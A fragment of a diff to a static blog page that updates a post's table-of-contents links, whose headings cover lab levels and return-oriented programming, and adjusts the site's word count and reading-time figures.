href="#level1"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level2"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-level3"><span class="nav-number">1.4.4.3.</span> <span class="nav-text">3.level3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2%E4%B8%8Elevel3%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8"><span class="nav-number">1.4.5.</span> <span class="nav-text">level2与level3实际应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part2-Return-Oriented-Programming-ROP"><span class="nav-number">1.4.6.</span> <span class="nav-text">Part2 Return-Oriented Programming(ROP)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level4"><span class="nav-number">1.4.6.1.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level5"><span class="nav-number">1.4.6.2.</span> <span class="nav-text">level5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-x86%E4%B8%AD%E7%9A%84lea%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%85%B6%E5%8F%98%E7%A7%8D"><span class="nav-number">1.4.6.2.1.</span> <span class="nav-text">前置知识:x86中的lea指令及其变种</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%AE%9E%E9%AA%8C%E6%84%9F%E6%83%B3"><span class="nav-number">1.5.</span> <span class="nav-text">0x05.实验感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E4%B8%8E%E8%B5%84%E6%96%99"><span class="nav-number">1.6.</span> <span class="nav-text">0x06.参考文献与资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%90%8E%E8%AE%B0"><span class="nav-number">1.7.</span> <span class="nav-text">0x07.后记</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -768,12 +877,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">232k</span>
+    <span title="站点总字数">239k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:31</span>
+    <span title="站点阅读时长">3:37</span>
 </div>
 
         
